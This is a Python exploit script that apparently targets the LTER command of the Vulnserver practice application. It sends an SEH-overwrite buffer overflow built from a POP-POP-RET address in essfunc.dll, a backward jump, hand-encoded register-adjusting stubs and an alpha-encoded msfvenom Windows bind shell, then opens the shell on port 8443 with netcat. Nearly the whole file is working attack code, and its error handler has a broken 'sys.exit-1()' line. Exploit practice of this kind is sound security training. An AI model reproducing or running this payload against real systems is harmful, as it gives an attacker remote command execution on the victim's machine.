#!/usr/bin/env python

import socket
import sys
import time
import os
from struct import pack

def sendPayload(host, port, payload):
	try:
		# Sending connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		s.send('')
		data = s.recv(4096)
		print(data)
		s.send(payload)
		s.close()
	except:
		print "final length: {length}".format(length = len(payload))
		sys.exit-1()

def main():
	# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f python -v bindShell -b '\x00' -e x86/alpha_mixed LPORT=8443 BufferRegister=EAX
	# Payload size: 710 bytes
	# Final size of python file: 3816 bytes
	bindShell =  ""
	bindShell += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
	bindShell += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
	bindShell += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
	bindShell += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
	bindShell += "\x42\x75\x4a\x49\x4b\x4c\x6b\x58\x6d\x52\x73\x30"
	bindShell += "\x77\x70\x35\x50\x63\x50\x4b\x39\x6b\x55\x55\x61"
	bindShell += "\x59\x50\x30\x64\x6e\x6b\x66\x30\x64\x70\x6c\x4b"
	bindShell += "\x53\x62\x56\x6c\x6e\x6b\x61\x42\x45\x44\x6c\x4b"
	bindShell += "\x33\x42\x65\x78\x34\x4f\x4e\x57\x33\x7a\x45\x76"
	bindShell += "\x56\x51\x4b\x4f\x4c\x6c\x55\x6c\x70\x61\x73\x4c"
	bindShell += "\x67\x72\x64\x6c\x65\x70\x4f\x31\x6a\x6f\x76\x6d"
	bindShell += "\x57\x71\x58\x47\x6d\x32\x6a\x52\x50\x52\x72\x77"
	bindShell += "\x4e\x6b\x52\x72\x74\x50\x4c\x4b\x31\x5a\x75\x6c"
	bindShell += "\x6e\x6b\x42\x6c\x64\x51\x54\x38\x79\x73\x52\x68"
	bindShell += "\x36\x61\x7a\x71\x42\x71\x4c\x4b\x70\x59\x37\x50"
	bindShell += "\x36\x61\x6a\x73\x6e\x6b\x72\x69\x35\x48\x39\x73"
	bindShell += "\x36\x5a\x42\x69\x4e\x6b\x37\x44\x4e\x6b\x55\x51"
	bindShell += "\x38\x56\x30\x31\x39\x6f\x6c\x6c\x49\x51\x58\x4f"
	bindShell += "\x76\x6d\x67\x71\x6b\x77\x34\x78\x69\x70\x62\x55"
	bindShell += "\x79\x66\x34\x43\x71\x6d\x49\x68\x47\x4b\x43\x4d"
	bindShell += "\x76\x44\x64\x35\x59\x74\x31\x48\x4c\x4b\x31\x48"
	bindShell += "\x77\x54\x35\x51\x6e\x33\x51\x76\x4e\x6b\x76\x6c"
	bindShell += "\x72\x6b\x6e\x6b\x46\x38\x77\x6c\x67\x71\x39\x43"
	bindShell += "\x4e\x6b\x76\x64\x4c\x4b\x37\x71\x38\x50\x4d\x59"
	bindShell += "\x31\x54\x76\x44\x56\x44\x53\x6b\x51\x4b\x55\x31"
	bindShell += "\x72\x79\x53\x6a\x46\x31\x6b\x4f\x4d\x30\x61\x4f"
	bindShell += "\x33\x6f\x42\x7a\x4e\x6b\x52\x32\x4a\x4b\x4e\x6d"
	bindShell += "\x51\x4d\x55\x38\x37\x43\x75\x62\x35\x50\x43\x30"
	bindShell += "\x61\x78\x30\x77\x44\x33\x57\x42\x63\x6f\x43\x64"
	bindShell += "\x52\x48\x50\x4c\x53\x47\x55\x76\x64\x47\x4b\x4f"
	bindShell += "\x6e\x35\x38\x38\x5a\x30\x33\x31\x35\x50\x53\x30"
	bindShell += "\x36\x49\x7a\x64\x61\x44\x32\x70\x61\x78\x35\x79"
	bindShell += "\x4d\x50\x42\x4b\x43\x30\x69\x6f\x58\x55\x32\x4a"
	bindShell += "\x57\x78\x36\x39\x56\x30\x59\x72\x4b\x4d\x71\x50"
	bindShell += "\x30\x50\x67\x30\x50\x50\x63\x58\x48\x6a\x46\x6f"
	bindShell += "\x49\x4f\x69\x70\x39\x6f\x78\x55\x6f\x67\x62\x48"
	bindShell += "\x35\x52\x55\x50\x75\x70\x6b\x4b\x4e\x69\x49\x76"
	bindShell += "\x63\x5a\x54\x50\x32\x76\x63\x67\x72\x48\x49\x52"
	bindShell += "\x69\x4b\x77\x47\x53\x57\x6b\x4f\x6a\x75\x51\x47"
	bindShell += "\x63\x58\x4d\x67\x59\x79\x76\x58\x69\x6f\x39\x6f"
	bindShell += "\x6b\x65\x36\x37\x75\x38\x34\x34\x38\x6c\x75\x6b"
	bindShell += "\x4d\x31\x4b\x4f\x4a\x75\x61\x47\x6d\x47\x61\x78"
	bindShell += "\x64\x35\x62\x4e\x70\x4d\x65\x31\x59\x6f\x68\x55"
	bindShell += "\x71\x78\x72\x43\x52\x4d\x50\x64\x75\x50\x6f\x79"
	bindShell += "\x7a\x43\x63\x67\x72\x77\x50\x57\x76\x51\x39\x66"
	bindShell += "\x51\x7a\x62\x32\x51\x49\x56\x36\x69\x72\x49\x6d"
	bindShell += "\x43\x56\x38\x47\x37\x34\x71\x34\x47\x4c\x56\x61"
	bindShell += "\x36\x61\x4e\x6d\x70\x44\x64\x64\x76\x70\x4b\x76"
	bindShell += "\x55\x50\x77\x34\x71\x44\x50\x50\x53\x66\x32\x76"
	bindShell += "\x52\x76\x63\x76\x76\x36\x30\x4e\x30\x56\x46\x36"
	bindShell += "\x72\x73\x33\x66\x71\x78\x53\x49\x4a\x6c\x45\x6f"
	bindShell += "\x6c\x46\x69\x6f\x4a\x75\x4f\x79\x4d\x30\x72\x6e"
	bindShell += "\x61\x46\x31\x56\x79\x6f\x70\x30\x72\x48\x66\x68"
	bindShell += "\x4f\x77\x47\x6d\x31\x70\x69\x6f\x69\x45\x6d\x6b"
	bindShell += "\x6a\x50\x6e\x55\x4e\x42\x33\x66\x42\x48\x39\x36"
	bindShell += "\x4c\x55\x4d\x6d\x4f\x6d\x39\x6f\x38\x55\x57\x4c"
	bindShell += "\x35\x56\x63\x4c\x77\x7a\x4d\x50\x79\x6b\x49\x70"
	bindShell += "\x62\x55\x53\x35\x4d\x6b\x31\x57\x44\x53\x71\x62"
	bindShell += "\x32\x4f\x43\x5a\x63\x30\x66\x33\x6b\x4f\x4b\x65"
	bindShell += "\x41\x41"

	# Target Host
	host = '127.0.0.1'
	port = 9999

	# Bind port
	bport = 8443

	# POP-POP-RET in essfunc.dll
	popPopRet = pack('<i', 0x6250120B)

	# Jump backward 0x80 (-128), \xFF is converted to \x80
	sehJMP = '\x74\xFF\x41\x41'
	
	# Make ECX match EIP so we can use a alpha encoded payload
	matchECXtoEIP = ""
	matchECXtoEIP += "\x2D\x12\x29\x01\x2D" 	# SUB EAX, 0x2d012912 	- Subtract from EAX to adjust ECX, we only care about CX
	matchECXtoEIP += "\x2D\x29\x61\x02\x55" 	# SUB EAX, 0x55026129 	- More subtracting
	matchECXtoEIP += "\x2D\x54\x76\x04\x7D" 	# SUB EAX, 0x7d047654 	- Last subtracting
	matchECXtoEIP += "\x66\x50" 			# PUSH AX
	matchECXtoEIP += "\x66\x59" 			# POP CX 		- ECX should now match EIP 
	
	# Without screwing with ESP put the address of our buffer into EAX and jump to it
	# 
	# 54			PUSH ESP
	# 58			POP EAX
	# 05 c0 00 00 00	ADD EAX, 0xC0
	# ff 30			PUSH DWORD PTR [EAX]
	# 58			POP EAX
	# ff e0			JMP EAX
	#
	# echo -ne "\x54\x58\x05\xC0\x00\x00\x00\xFF\x30\x58\xFF\xE0" | msfvenom -p - -a x86 --platform windows -e x86/alpha_mixed BufferRegister=ECX -f python
	# Final size of python file: 378 bytes
	adjESPnJMP =  ""
	adjESPnJMP += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
	adjESPnJMP += "\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
	adjESPnJMP += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
	adjESPnJMP += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x33"
	adjESPnJMP += "\x64\x46\x38\x67\x75\x79\x50\x45\x50\x37\x70\x43\x30"
	adjESPnJMP += "\x59\x6f\x34\x70\x73\x68\x4b\x4f\x6b\x50\x41\x41"

	payload = 'LTER /.:/' + 'A' * 1999 + bindShell + 'A' * (3389 - 1999 - len(bindShell)) + matchECXtoEIP + adjESPnJMP + 'A' * (3519 - 3389 - len(matchECXtoEIP) - len(adjESPnJMP) - len(sehJMP)) + sehJMP + popPopRet + 'B' * (5000 - 3519 - 4 - 9)

	print('Total payload length: {0}'.format(len(payload)))

	print('\r\n\r\n[+] Sending payload')
	sendPayload(host, port, payload)
	print('[+] Connecting to bind shell')
	time.sleep(1)
	os.system('nc {0} {1}'.format(host, bport))
	print('[+] Connection closed.')

if __name__ == "__main__":
	sys.exit(main())